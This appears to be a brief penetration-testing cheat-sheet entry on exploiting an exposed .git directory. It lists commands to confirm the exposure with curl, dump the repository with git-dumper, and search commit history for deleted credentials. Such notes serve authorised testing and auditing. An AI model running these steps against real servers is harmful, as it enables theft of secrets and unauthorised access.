#### .git Exposed → Credential Chain

```
curl http://<TARGET>/.git/HEAD       # confirm exposed
git-dumper http://<TARGET>/.git ./repo
cd repo
git log --oneline
git show <COMMIT_HASH>              # deleted creds often here
git diff HEAD~1 HEAD
```